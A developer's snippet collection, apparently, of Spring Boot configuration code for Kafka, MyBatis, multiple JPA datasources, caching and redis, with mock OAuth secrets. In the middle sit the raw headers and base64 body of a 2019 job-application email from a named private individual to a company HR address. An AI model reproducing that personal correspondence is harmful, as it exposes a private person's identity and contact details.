        LOGGER.warn("Generating random name for this application -- please set spring.application.name property !");
        return UUID.randomUUID().toString();
    }

}
--------------------------------------------------------------------------------------------------------
import org.springframework.boot.autoconfigure.kafka.KafkaProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.kafka.annotation.EnableKafka;
import org.springframework.kafka.core.ConsumerFactory;
import org.springframework.kafka.core.DefaultKafkaConsumerFactory;
import org.springframework.kafka.core.DefaultKafkaProducerFactory;
import org.springframework.kafka.core.ProducerFactory;

import java.util.Map;

/**
 * http://docs.spring.io/spring-boot/docs/1.5.3.BUILD-SNAPSHOT/reference/htmlsingle/#boot-features-kafka
 */
@Configuration
@EnableKafka
public class KafkaConfig {


    /**
     * TODO: eggs hurt:Kyro Serialization needs the default constructor and 'implements Serializable'
     * KafkaProperties and DefaultKafkaProducerFactory can not be Serialized
     * @param properties
     * @return
     */
    @Bean("kafkaPropertiesMap")
    public Map<String, Object> kafkaPropertiesMap(KafkaProperties properties) {
        Map<String, Object> producerProperties = properties.buildProducerProperties();
        return producerProperties;
    }

    /**
     * Customized ProducerFactory bean.
     * @param properties the kafka properties.
     * @return the bean.
     */
    @Bean("kafkaProducerFactory")
    public ProducerFactory<?, ?> kafkaProducerFactory(KafkaProperties properties) {
        Map<String, Object> producerProperties = properties.buildProducerProperties();
        return new DefaultKafkaProducerFactory<>(producerProperties);
    }

    /**
     * 注意：目前Spring Boot自动配置只支持单个分组group-id创建consumer，
     * 如需要多个应该创建多个不同的DefaultKafkaConsumerFactory properties.getConsumer().setGroupId(groupId);
     * Customized ConsumerFactory bean.
     * @param properties the kafka properties.
     * @return the bean.
     */
    @Bean("kafkaConsumerFactory")
    public ConsumerFactory<?, ?> kafkaConsumerFactory(KafkaProperties properties) {
        Map<String, Object> consumerProperties = properties.buildConsumerProperties();
        return new DefaultKafkaConsumerFactory<>(consumerProperties);
    }
}
--------------------------------------------------------------------------------------------------------

import org.apache.ibatis.session.SqlSessionFactory;
import org.mybatis.spring.SqlSessionFactoryBean;
import org.mybatis.spring.annotation.MapperScan;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.boot.autoconfigure.jdbc.DataSourceBuilder;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.io.support.PathMatchingResourcePatternResolver;
import org.springframework.jdbc.datasource.DataSourceTransactionManager;

import javax.sql.DataSource;

@Configuration
@MapperScan(basePackages = {"com.maxplus1.demo.dao.test2db"}, sqlSessionFactoryRef = "test2dbSqlSessionFactory")
public class Test2dbConfig {

    private final static Logger log = LoggerFactory.getLogger(Test2dbConfig.class);

    @Bean(name = "test2db")
    @ConfigurationProperties(prefix = "spring.datasource.test2db")
    public DataSource dataSource() {
        return DataSourceBuilder.create().build();
    }

    @Bean(name = "test2dbTransactionManager")
    public DataSourceTransactionManager transactionManager(@Qualifier("test2db") DataSource dataSource) {
        return new DataSourceTransactionManager(dataSource);
    }

    @Bean(name = "test2dbSqlSessionFactory")
    public SqlSessionFactory sqlSessionFactory(@Qualifier("test2db") DataSource dataSource) throws Exception {
        SqlSessionFactoryBean factoryBean = new SqlSessionFactoryBean();
        factoryBean.setDataSource(dataSource);
        factoryBean.setTypeAliasesPackage("com.maxplus1.demo.entity");
        factoryBean.setMapperLocations(
                new PathMatchingResourcePatternResolver().getResources("classpath:mapper/test2db/*.xml"));
        return factoryBean.getObject();
    }
}
--------------------------------------------------------------------------------------------------------
security.oauth2.main.clientId=client-main-id-123
security.oauth2.main.clientSecret=client-main-secret-abc
security.oauth2.admin.clientId=client-admin-id-123
security.oauth2.admin.clientSecret=client-admin-secret-abc
security.oauth2.pivotal-cla.tokenSecret=pivotal_cla_mock_access_token

logging.level.root=ERROR
logging.level.com.gargoylesoftware.htmlunit.javascript.StrictErrorReporter=OFF
spring.main.banner-mode=off
--------------------------------------------------------------------------------------------------------
spring.thymeleaf.mode=LEGACYHTML5
spring.profiles.active=local
spring.resources.chain.strategy.content.enabled=true
spring.resources.chain.enabled=true
management.context-path=/manage

spring.jpa.generate-ddl=false
spring.jpa.hibernate.ddl-auto=validate

spring.session.store-type=redis
--------------------------------------------------------------------------------------------------------
@PackagePrivate // visible for testing
	static final String ATTR_NAME = "importedSignatures";
	
@PreAuthorize("@gitHubSignature.check(#request.getHeader('X-Hub-Signature'), #body)")
@PreAuthorize("hasRole('CLA_AUTHOR')")

@RequestMapping(value = "/admin/cla/{claId}", method = RequestMethod.DELETE)
	public String delete(@AuthenticationPrincipal User user, @PathVariable long claId) {
		claRepo.delete(claId);
		return "redirect:/admin/cla/?success";
	}
	

--------------------------------------------------------------------------------------------------------
	if (updatePullRequest != null) {
			updatePullRequest.getCommitStatus().setAdmin(currentUser.isAdmin());
			claService.savePullRequestStatus(updatePullRequest);
		}

		String repositoryOwner = repositoryParts[0];
		String repositoryName = repositoryParts[1];

		redirect.addAttribute("repositoryOwner", repositoryOwner);
		redirect.addAttribute("repositoryName", repositoryName);
		redirect.addAttribute("pullRequestId", claRequest.getPullRequestId());
		return "redirect:https://github.com/{repositoryOwner}/{repositoryName}/pull/{pullRequestId}";
--------------------------------------------------------------------------------------------------------
@Bean
	@ConfigurationProperties(prefix = "spring.user.datasource")
	public DataSource postgresqlDataSource() {
		return DataSourceBuilder
					.create()
					.build();
	}

--------------------------------------------------------------------------------------------------------
redis-cli info stats
redis-cli info memory
redis-cli --latency -h 127.0.0.1 -p 6379


λ: docker pull redis
λ: docker run -p 6379:6379 -d --name redis-cache       
   \-v /usr/configs:/usr/redis_config 
   \redis redis-server /usr/redis_config/redis.conf
λ: docker exec -it redis-cache /bin/bash
λ: redis-cli

λ: for /l %N in (1 1 5) do
   \curl -o /dev/null -s -w "%{time_total}\n"  
   \localhost:8080/post/IDX001
--------------------------------------------------------------------------------------------------------
@Configuration
@EnableCaching
public class CachingConfig {
 
    @Bean
    public CacheManager cacheManager() {
        return new ConcurrentMapCacheManager("addresses");
    }
}
@Component
public class SimpleCacheCustomizer implements CacheManagerCustomizer<ConcurrentMapCacheManager> {
 
    @Override
    public void customize(ConcurrentMapCacheManager cacheManager) {
        cacheManager.setCacheNames(asList("users", "transactions"));
    }
}

https://www.baeldung.com/spring-cache-tutorial

@Cacheable(value = "post-single", key = "#id", unless = "#result.shares < 500")
@GetMapping("/{id}")
public Post getPostByID(@PathVariable String id) throws PostNotFoundException {
    log.info("get post with id {}", id);
    return postService.getPostByID(id);
}
@Cacheable(value = "post-top")
@GetMapping("/top")
public List<Post> getTopPosts() {
    return postService.getTopPosts();
}
--------------------------------------------------------------------------------------------------------
@Configuration
@ComponentScan
@EnableTransactionManagement
@PropertySource(value = { "classpath:application.properties" })
public class AppConfig 
{
    @Autowired
    private Environment env;
 
    @Value("${init-db:false}")
    private String initDatabase;
     
    @Bean
    public static PropertySourcesPlaceholderConfigurer placeHolderConfigurer()
    {
        return new PropertySourcesPlaceholderConfigurer();
    }    
 
    @Bean
    public JdbcTemplate jdbcTemplate(DataSource dataSource)
    {
        return new JdbcTemplate(dataSource);
    }
 
    @Bean
    public PlatformTransactionManager transactionManager(DataSource dataSource)
    {
        return new DataSourceTransactionManager(dataSource);
    }
 
    @Bean
    public DataSource dataSource()
    {
        BasicDataSource dataSource = new BasicDataSource();
        dataSource.setDriverClassName(env.getProperty("jdbc.driverClassName"));
        dataSource.setUrl(env.getProperty("jdbc.url"));
        dataSource.setUsername(env.getProperty("jdbc.username"));
        dataSource.setPassword(env.getProperty("jdbc.password"));
        return dataSource;
    }
 
    @Bean
    public DataSourceInitializer dataSourceInitializer(DataSource dataSource)
    {
        DataSourceInitializer dataSourceInitializer = new DataSourceInitializer();    
        dataSourceInitializer.setDataSource(dataSource);
        ResourceDatabasePopulator databasePopulator = new ResourceDatabasePopulator();
        databasePopulator.addScript(new ClassPathResource("data.sql"));
        dataSourceInitializer.setDatabasePopulator(databasePopulator);
        dataSourceInitializer.setEnabled(Boolean.parseBoolean(initDatabase));
        return dataSourceInitializer;
    }
}

<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-jdbc</artifactId>
</dependency>
--------------------------------------------------------------------------------------------------------
    org.apache.tomcat.jdbc.pool.DataSource
    com.zaxxer.hikari.HikariDataSource
    org.apache.commons.dbcp.BasicDataSource
    org.apache.commons.dbcp2.BasicDataSource
--------------------------------------------------------------------------------------------------------
createdb -h localhost -p 5432 -U postgres springbootdb
--------------------------------------------------------------------------------------------------------
    spring.jpa.hibernate.naming-strategy=org.hibernate.cfg.DefaultComponentSafeNamingStrategy
--------------------------------------------------------------------------------------------------------
X-Google-Smtp-Source: APXvYqwPlyHgYMdvUmFSWEspK+Nng6oAdnZK3qX2cMlBT91hhcAdnIvgBCqP6HuHiZljycCzzUHe
X-Received: by 2002:a05:6512:488:: with SMTP id v8mr1598877lfq.37.1569490796011;
        Thu, 26 Sep 2019 02:39:56 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1569490796; cv=none;
        d=google.com; s=arc-20160816;
        b=aSSYtveUq7dO6dM/VkqAhKnE17D1kCR5q4E+4B+lZXGQaSzClFKhGJdwZPPpRArAXn
         byk5LoiVnFyXSIdwk6p8mf5nsVJyYnNf5KFAnZfnOEhr8J130PptA06zwai2JO/quSc0
         uO6D0zPSORRRIBbPX9I4liuacH0CwpFRTZr2nNowDIDZyp4j33WqsPsafQwrt/NjE0sB
         AXfuIZTt3utJbKFIn8S5zLTh06Ie6kGahrCUnUUBM7Vsv/A7b+j9k0E9KQwu7Zd51uJt
         AQS3fpxtA91bpos+C+GmC3M3AMrPnNc4T+t57UdKq7+AfoxJe5oXkx+0hcuSOBFeZ8Kl
         NEjg==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;
        h=message-id:date:mime-version:to:envelope-from:from:dkim-signature;
        bh=a1ST33XqUX/UOthytJtllXhSHYQ5bVvaYKMsU2KVvI4=;
        b=ncYv1VQysywh5F5WAg9JVSt/2G5e+xsBvIQjKEBapTRT5ZQFD5vONdgd3dehEPTZb6
         n1WzPxwrBNB/dZdTXK2Kz0jXFRdNlmsLCEZImVRynGVGtMvZNBua+njh5k+ZMvlFxpxo
         vioR9mEfcbpdkR35wboyiKHoiObw/RPTPFn6Sci7JqonK2LPxOrjM4z1mdIVhj/b6rZP
         tXsTBNcRxHOrqbis7FzENfFvaSzVo47FZ8Vr7Z7FsgrJ3PdA0YrqwM/YtI1wjEy3nPgq
         xX9P2/cQYyTl0niQ5tuFmrI0WmtB52ZZj1mOjXIV2ts3uoZ2dS4OKUPrgNtm2KquZ21O
         /Kng==
ARC-Authentication-Results: i=1; mx.google.com;
       dkim=pass header.i=@yandex.ru header.s=mail header.b=bl0nZDEL;
       spf=pass (google.com: domain of alexander.rogalsky@yandex.ru designates 5.45.198.247 as permitted sender) smtp.mailfrom=alexander.rogalsky@yandex.ru;
       dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=yandex.ru
Return-Path: <alexander.rogalsky@yandex.ru>
Received: from forward104j.mail.yandex.net (forward104j.mail.yandex.net. [5.45.198.247])
        by mx.google.com with ESMTPS id a12si1416939lji.80.2019.09.26.02.39.55
        for <hr@welltory.com>
        (version=TLS1_2 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128/128);
        Thu, 26 Sep 2019 02:39:56 -0700 (PDT)
Received-SPF: pass (google.com: domain of alexander.rogalsky@yandex.ru designates 5.45.198.247 as permitted sender) client-ip=5.45.198.247;
Authentication-Results: mx.google.com;
       dkim=pass header.i=@yandex.ru header.s=mail header.b=bl0nZDEL;
       spf=pass (google.com: domain of alexander.rogalsky@yandex.ru designates 5.45.198.247 as permitted sender) smtp.mailfrom=alexander.rogalsky@yandex.ru;
       dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=yandex.ru
Received: from mxback12g.mail.yandex.net (mxback12g.mail.yandex.net [IPv6:2a02:6b8:0:1472:2741:0:8b7:91])
        by forward104j.mail.yandex.net (Yandex) with ESMTP id 821774A0A29
        for <hr@welltory.com>; Thu, 26 Sep 2019 12:39:55 +0300 (MSK)
Received: from localhost (localhost [::1])
        by mxback12g.mail.yandex.net (nwsmtp/Yandex) with ESMTP id WDB5gn15Mq-dstKw86f;
        Thu, 26 Sep 2019 12:39:54 +0300
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=yandex.ru; s=mail; t=1569490794;
        bh=a1ST33XqUX/UOthytJtllXhSHYQ5bVvaYKMsU2KVvI4=;
        h=Message-Id:Date:To:From;
        b=bl0nZDELhXKESRVtjrAdgxJnln8nRGTdBQqkWe7fN1PQ1PBFx9BGtDcuZeIKJrvzq
         WOuB1guoqazbBnZ3ctipiCc80Y30AWJVgEZnZwoUt6j72f2s5Y27GaxNU2HQpjC3IE
         O0Lka7fnqnaDqF0B4DW496tq26uC6QTuMYor2D5I=
Authentication-Results: mxback12g.mail.yandex.net; dkim=pass header.i=@yandex.ru
Received: by iva8-8aca73b241e5.qloud-c.yandex.net with HTTP;
        Thu, 26 Sep 2019 12:39:54 +0300
From: Alexander Rogalsky <alexander.rogalsky@yandex.ru>
Envelope-From: alexander-rogalsky@yandex.ru
To: hr@welltory.com
MIME-Version: 1.0
X-Mailer: Yamail [ http://yandex.ru ] 5.0
Date: Thu, 26 Sep 2019 12:39:54 +0300
Message-Id: <10371569490794@iva8-8aca73b241e5.qloud-c.yandex.net>
Content-Type: multipart/mixed;
        boundary="----==--bound.1039.iva8-8aca73b241e5.qloud-c.yandex.net"


------==--bound.1039.iva8-8aca73b241e5.qloud-c.yandex.net
Content-Transfer-Encoding: base64
Content-Type: text/html; charset=utf-8

PGRpdj48ZGl2PjxkaXY+PGRpdj48ZGl2PjxkaXY+PGRpdj48ZGl2PjxkaXY+PGRpdj48ZGl2Pjxk
aXY+PGRpdj48ZGl2PjxkaXY+PGRpdj48ZGl2PjxkaXY+PGRpdj48ZGl2PjxkaXY+PGRpdj48ZGl2
PjxkaXY+PGRpdj48ZGl2PjxkaXY+PGRpdj48ZGl2PjxkaXY+PGRpdj48ZGl2PjxkaXY+PGRpdj48
ZGl2PjxkaXY+PGRpdj48ZGl2PjxkaXY+PGRpdj48ZGl2PjxkaXY+PGRpdj48ZGl2PjxkaXY+PGRp
dj48ZGl2PjxkaXY+PGRpdj48ZGl2PjxkaXY+PGRpdj48ZGl2PjxkaXY+PGRpdj48ZGl2PjxkaXY+
PGRpdj48ZGl2PjxkaXY+PGRpdj48ZGl2PjxkaXY+PGRpdj48ZGl2PjxkaXY+PGRpdj48ZGl2Pjxk
aXY+PGRpdj48ZGl2PjxkaXY+PGRpdj48ZGl2PjxkaXY+PGRpdj48ZGl2PjxkaXY+PGRpdj48ZGl2
PjxkaXY+PGRpdj48ZGl2PjxkaXY+PGRpdj48ZGl2PjxkaXY+PGRpdiBzdHlsZT0iYmFja2dyb3Vu
ZDpyZ2IoIDI1NSAsIDI1NSAsIDI1NSApO2NvbG9yOnJnYiggMCAsIDAgLCAwICk7Zm9udDoxNXB4
ICdhcmlhbCcgLCBzYW5zLXNlcmlmO3RleHQtdHJhbnNmb3JtOm5vbmU7d2hpdGUtc3BhY2U6bm9y
bWFsIj5EZWFyIFNpciBvciBNYWRhbSw8L2Rpdj48ZGl2IHN0eWxlPSJiYWNrZ3JvdW5kOnJnYigg
MjU1ICwgMjU1ICwgMjU1ICk7Y29sb3I6cmdiKCAwICwgMCAsIDAgKTtmb250OjE1cHggJ2FyaWFs
JyAsIHNhbnMtc2VyaWY7dGV4dC10cmFuc2Zvcm06bm9uZTt3aGl0ZS1zcGFjZTpub3JtYWwiPsKg
PC9kaXY+PGRpdiBzdHlsZT0iYmFja2dyb3VuZDpyZ2IoIDI1NSAsIDI1NSAsIDI1NSApO2NvbG9y
OnJnYiggMCAsIDAgLCAwICk7Zm9udDoxNXB4ICdhcmlhbCcgLCBzYW5zLXNlcmlmO3RleHQtdHJh
bnNmb3JtOm5vbmU7d2hpdGUtc3BhY2U6bm9ybWFsIj5XaXRoIHJlZmVyZW5jZSB0byB0aGUgYW5u
b3VuY2VtZW50IG9mIGFueSBwb3RlbnRpYWwgb3BlbmluZyBpbiBpbmZvcm1hdGljcy9hbmFseXRp
Y2FsIHNlcnZpY2VzIGZpZWxkcyBJIHdvdWxkIGhlcmVieSBsaWtlIHRvIHByb3ZpZGUgeW91IHdp
dGggdGhlIGZvbGxvd2luZyBpbmZvcm1hdGlvbiBjb25jZXJuaW5nIG15IGludGVyZXN0IGFuZCBk
ZXNpcmUgdG8gcGFydGljaXBhdGUgaW4gdGhlIHNlbGVjdGlvbiBwcm9jZXNzIGZvciB0aGlzIHZh
Y2FudCByb2xlLjwvZGl2PjxkaXYgc3R5bGU9ImJhY2tncm91bmQ6cmdiKCAyNTUgLCAyNTUgLCAy
NTUgKTtjb2xvcjpyZ2IoIDAgLCAwICwgMCApO2ZvbnQ6MTVweCAnYXJpYWwnICwgc2Fucy1zZXJp
Zjt0ZXh0LXRyYW5zZm9ybTpub25lO3doaXRlLXNwYWNlOm5vcm1hbCI+wqA8L2Rpdj48ZGl2IHN0
eWxlPSJiYWNrZ3JvdW5kOnJnYiggMjU1ICwgMjU1ICwgMjU1ICk7Y29sb3I6cmdiKCAwICwgMCAs
IDAgKTtmb250OjE1cHggJ2FyaWFsJyAsIHNhbnMtc2VyaWY7dGV4dC10cmFuc2Zvcm06bm9uZTt3
aGl0ZS1zcGFjZTpub3JtYWwiPkluIDIwMDkgSSBoYXZlIGNvbXBsZXRlZCBhIGZpdmUgeWVhcuKA
mXMgdGVybSBlZHVjYXRpb24gd2l0aCBzcGVjaWFsaXphdGlvbiBpbiBhcHBsaWVkIGluZm9ybWF0
aWNzIGluIGVjb25vbWljcyBhdCBTYWludC1QZXRlcnNidXJnIE5hdGlvbmFsIFJlc2VhcmNoIFVu
aXZlcnNpdHkgb2YgSW5mb3JtYXRpb24gVGVjaG5vbG9naWVzLCBNZWNoYW5pY3MgYW5kIE9wdGlj
cyAodGhlIEZhY3VsdHkgb2YgSVQpLiBNeSBncmFkdWF0ZSB0aGVzaXMgd2FzIGluIFNvZnR3YXJl
IGRldmVsb3BtZW50IGZvciBvcmRlciBtYW5hZ2VtZW50IGluIHBvbHlncmFwaGljIGJ1c2luZXNz
IChjYWxlbmRhciBwbGFubmluZywgc2NoZWR1bGluZywgcHJpb3JpdGl6aW5nIGFuZCBtb25pdG9y
aW5nOiBhZGp1c3RpbmcgdGhlIHdvcmtsb2FkIGFuZCB0aGUgdGltZWxpbmUgdG8gZ2V0IGJhY2sg
b24gdHJhY2ssIGlkZW50aWZ5aW5nIHRoZSBzY29wZSBvZiBvcmRlcnMgYW5kIHJlcXVpcmVkIHJl
c291cmNlcywgbWFuYWdpbmcgb3JkZXJzIGFjcm9zcyBtdWx0aXBsZSBsb2NhdGlvbnMsIGFzc2ln
bmluZyB0YXNrcyBhbmQgY2hlY2tpbmcgcHJvZ3Jlc3MgdG8gc3RheSBmb2N1c2VkIG9uIGEgcHJv
ZHVjdGlvbiBjaGFydCBhbmQgbWF4aW1pemluZyBvdXRwdXQgdGFyZ2V0KSBmb3Igd2hpY2ggSSB3
YXMgd29ya2luZyBpbsKgMjAwOC0yMDA5LjwvZGl2PjxkaXYgc3R5bGU9ImJhY2tncm91bmQ6cmdi
KCAyNTUgLCAyNTUgLCAyNTUgKTtjb2xvcjpyZ2IoIDAgLCAwICwgMCApO2ZvbnQ6MTVweCAnYXJp
YWwnICwgc2Fucy1zZXJpZjt0ZXh0LXRyYW5zZm9ybTpub25lO3doaXRlLXNwYWNlOm5vcm1hbCI+
wqA8L2Rpdj48ZGl2IHN0eWxlPSJiYWNrZ3JvdW5kOnJnYiggMjU1ICwgMjU1ICwgMjU1ICk7Y29s
b3I6cmdiKCAwICwgMCAsIDAgKTtmb250OjE1cHggJ2FyaWFsJyAsIHNhbnMtc2VyaWY7dGV4dC10
cmFuc2Zvcm06bm9uZTt3aGl0ZS1zcGFjZTpub3JtYWwiPldoZW4gSSBncmFkdWF0ZWQgZnJvbSB0
aGUgVW5pdmVyc2l0eSBJIHdhcyBpbnRlcmVzdGVkIGluIGEgbmV3IGNoYWxsZW5nZSBhbmQgb3Bw
b3J0dW5pdHkgdG8gdXNlIG15IHNraWxscyBhbmQgZXhwZXJpZW5jZSBpbiBhIGRpZmZlcmVudCBj
YXBhY2l0eSB0aGFuIEkgaGFkIGluIHRoZSBwYXN0IHdvcmtpbmcgaW4gYSBzb2Z0d2FyZS1vcmll
bnRlZCBlbnZpcm9ubWVudC4gVGhhdCdzIHdoeSBJIGNvbmNlbnRyYXRlZCBvbiBteSBza2lsbHMg
aW4gdGhlIGFuYWx5dGljYWwgZmllbGQgd2l0aCByZXNwZWN0IHRvIElUIGJlY2F1c2UgSSByZWFs
aXplZCBpdCB3YXMgYW4gYXJlYSB3aGVyZSBJIGNvdWxkIG5vdCBvbmx5IG1ha2Ugc2lnbmlmaWNh
bnQgY29udHJpYnV0aW9ucyBidXQgSSBoYWQgYSBwYXNzaW9uIGZvciBtYXRoZW1hdGljcyBhbmQg
Y29nbml0aXZlIGFwdGl0dWRlcyB0byBudW1lcmljYWwgYW5hbHlzaXMgaW
----- Message truncated -----
------==--bound.1039.iva8-8aca73b241e5.qloud-c.yandex.net--
--------------------------------------------------------------------------------------------------------
import java.util.HashMap;
 
import javax.sql.DataSource;
 
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.PropertySource;
import org.springframework.context.annotation.PropertySources;
import org.springframework.core.env.Environment;
import org.springframework.jdbc.datasource.DriverManagerDataSource;
import org.springframework.orm.jpa.JpaTransactionManager;
import org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean;
import org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter;
import org.springframework.transaction.PlatformTransactionManager;
 
@Configuration
// Load to Environment
// (@see resources/datasource-cfg.properties).
@PropertySources({ @PropertySource("classpath:datasource-cfg.properties") })
public class DataSource1Config {
 
    @Autowired
    private Environment env; // Contains Properties Load by @PropertySources
 
    @Bean
    public DataSource ds1Datasource() {
 
        DriverManagerDataSource dataSource = new DriverManagerDataSource();
        dataSource.setDriverClassName(env.getProperty("spring.datasource.driver-class-name.1"));
        dataSource.setUrl(env.getProperty("spring.datasource.url.1"));
        dataSource.setUsername(env.getProperty("spring.datasource.username.1"));
        dataSource.setPassword(env.getProperty("spring.datasource.password.1"));
 
        return dataSource;
    }
 
    @Bean
    public LocalContainerEntityManagerFactoryBean ds1EntityManager() {
        LocalContainerEntityManagerFactoryBean em = new LocalContainerEntityManagerFactoryBean();
        em.setDataSource(ds1Datasource());
 
        // Scan Entities in Package:
        em.setPackagesToScan(new String[] { Constants.PACKAGE_ENTITIES_1 });
        em.setPersistenceUnitName(Constants.JPA_UNIT_NAME_1); // Important !!
 
        //
        HibernateJpaVendorAdapter vendorAdapter = new HibernateJpaVendorAdapter();
 
        em.setJpaVendorAdapter(vendorAdapter);
 
        HashMap<String, Object> properties = new HashMap<>();
 
        // JPA & Hibernate
        properties.put("hibernate.dialect", env.getProperty("spring.jpa.properties.hibernate.dialect.1"));
        properties.put("hibernate.show-sql", env.getProperty("spring.jpa.show-sql.1"));
 
        // Solved Error: PostGres createClob() is not yet implemented.
        // PostGres Only:
        // properties.put("hibernate.temp.use_jdbc_metadata_defaults",  false);
 
        em.setJpaPropertyMap(properties);
        em.afterPropertiesSet();
        return em;
    }
 
    @Bean
    public PlatformTransactionManager ds1TransactionManager() {
 
        JpaTransactionManager transactionManager = new JpaTransactionManager();
        transactionManager.setEntityManagerFactory(ds1EntityManager().getObject());
        return transactionManager;
    }
 
}

import java.util.HashMap;
 
import javax.sql.DataSource;
 
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.PropertySource;
import org.springframework.context.annotation.PropertySources;
import org.springframework.core.env.Environment;
import org.springframework.jdbc.datasource.DriverManagerDataSource;
import org.springframework.orm.jpa.JpaTransactionManager;
import org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean;
import org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter;
import org.springframework.transaction.PlatformTransactionManager;
 
@Configuration
// Load to Environment
// (@see resources/datasource-cfg.properties).
@PropertySources({ @PropertySource("classpath:datasource-cfg.properties") })
public class DataSource2Config {
 
    @Autowired
    private Environment env; // Contains Properties Load by @PropertySources
 
    @Bean
    public DataSource ds2Datasource() {
        DriverManagerDataSource dataSource = new DriverManagerDataSource();
 
        dataSource.setDriverClassName(env.getProperty("spring.datasource.driver-class-name.2"));
        dataSource.setUrl(env.getProperty("spring.datasource.url.2"));
        dataSource.setUsername(env.getProperty("spring.datasource.username.2"));
        dataSource.setPassword(env.getProperty("spring.datasource.password.2"));
 
        return dataSource;
    }
 
    @Bean
    public LocalContainerEntityManagerFactoryBean ds2EntityManager() {
        LocalContainerEntityManagerFactoryBean em = new LocalContainerEntityManagerFactoryBean();
        em.setDataSource(ds2Datasource());
 
        // Scan Entities in Package:
        em.setPackagesToScan(new String[] { Constants.PACKAGE_ENTITIES_2 });
 
        em.setPersistenceUnitName(Constants.JPA_UNIT_NAME_2);
        HibernateJpaVendorAdapter vendorAdapter = new HibernateJpaVendorAdapter();
        em.setJpaVendorAdapter(vendorAdapter);
 
        HashMap<String, Object> properties = new HashMap<>();
        // JPA & Hibernate
        properties.put("hibernate.dialect", env.getProperty("spring.jpa.properties.hibernate.dialect.2"));
        properties.put("hibernate.show-sql", env.getProperty("spring.jpa.show-sql.2"));
 
        // Solved Error: PostGres createClob() is not yet implemented.
        // PostGres Only.
        // properties.put("hibernate.temp.use_jdbc_metadata_defaults",  false);
 
        em.setJpaPropertyMap(properties);
        em.afterPropertiesSet();
        return em;
    }
 
    @Bean
    public PlatformTransactionManager ds2TransactionManager() {
 
        JpaTransactionManager transactionManager = new JpaTransactionManager();
        transactionManager.setEntityManagerFactory(ds2EntityManager().getObject());
        return transactionManager;
    }
 
}
--------------------------------------------------------------------------------------------------------
import java.util.List;
 
import javax.persistence.EntityManager;
import javax.persistence.PersistenceContext;
import javax.persistence.Query;
 
import org.o7planning.sbmultids.config.Constants;
import org.o7planning.sbmultids.entity1.Publisher;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Repository;
 
@Repository
public class PublisherDAO {
 
    @Autowired
    @PersistenceContext( unitName= Constants.JPA_UNIT_NAME_1)
    private EntityManager entityManager;
 
    public List<Publisher> listPublishers() {
        String sql = "Select e from " + Publisher.class.getName() + " e ";
        Query query = entityManager.createQuery(sql, Publisher.class);
        return query.getResultList();
    }
 
    public Publisher findById(Long id) {
        return this.entityManager.find(Publisher.class, id);
    }
     
}

import java.util.List;
 
import javax.persistence.EntityManager;
import javax.persistence.PersistenceContext;
import javax.persistence.Query;
 
import org.o7planning.sbmultids.config.Constants;
import org.o7planning.sbmultids.entity2.Advertiser;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Repository;
 
@Repository
public class AdvertiserDAO {
  
 
    @Autowired
    @PersistenceContext(unitName = Constants.JPA_UNIT_NAME_2)
    private EntityManager entityManager;
 
    public List<Advertiser> listAdvertisers() {
        String sql = "Select e from " + Advertiser.class.getName() + " e ";
        Query query = entityManager.createQuery(sql, Advertiser.class);
        return query.getResultList();
    }
 
    public Advertiser findById(Long id) {
        return this.entityManager.find(Advertiser.class, id);
    }
     
}
--------------------------------------------------------------------------------------------------------
@Configuration
@EnableTransactionManagement
@ComponentScan("ord.paulushc")
@PropertySource("file:./database.properties")
@EnableJpaRepositories(
        basePackages = "org.paulushc",
        entityManagerFactoryRef = "mainEntityManager",
        transactionManagerRef = "mainTransactionManager")
public class DatabaseMain {

    @Value("${main.db.driver}")
    private String driver;
    @Value("${main.db.url}")
    private String url;
    @Value("${main.db.username}")
    private String username;
    @Value("${main.db.password}")
    private String password;
    @Value("${hibernate.dialect}")
    private String dialect;
    @Value("${hibernate.show_sql}")
    private boolean showSQL;
    @Value("${hibernate.format_sql}")
    private boolean formatSQL;
    @Value("${entitymanager.packages.to.scan}")
    private String packageScan;
    @Value("${connection.release_mode}")
    private String releaseMode;

    @Bean(name = "mainDataSource")
    @Primary
    public DataSource mainDataSource() {
        DriverManagerDataSource dataSource = new DriverManagerDataSource();
        dataSource.setDriverClassName(driver);
        dataSource.setUrl(url);
        dataSource.setUsername(username);
        dataSource.setPassword(password);
        return dataSource;
    }

    @Bean(name = "mainEntityManager")
    @Primary
    public LocalContainerEntityManagerFactoryBean mainEntityManager() {
        LocalContainerEntityManagerFactoryBean em = new LocalContainerEntityManagerFactoryBean();
        em.setDataSource(mainDataSource());
        em.setPackagesToScan(new String[] { packageScan });
        HibernateJpaVendorAdapter vendorAdapter = new HibernateJpaVendorAdapter();
        em.setJpaVendorAdapter(vendorAdapter);
        em.setJpaProperties(hibernateProperties());

        return em;
    }

    @Bean(name = "mainTransactionManager")
    @Primary
    public PlatformTransactionManager mainTransactionManager() {
        JpaTransactionManager transactionManager = new JpaTransactionManager();
        transactionManager.setEntityManagerFactory(mainEntityManager().getObject());
        return transactionManager;
    }

    @Bean(name = "mainSessionFactory")
    @Primary
    public LocalSessionFactoryBean mainSessionFactory() {
        LocalSessionFactoryBean sessionFactoryBean = new LocalSessionFactoryBean();
        sessionFactoryBean.setDataSource(mainDataSource());
        sessionFactoryBean.setPackagesToScan(packageScan);
        sessionFactoryBean.setHibernateProperties(hibernateProperties());
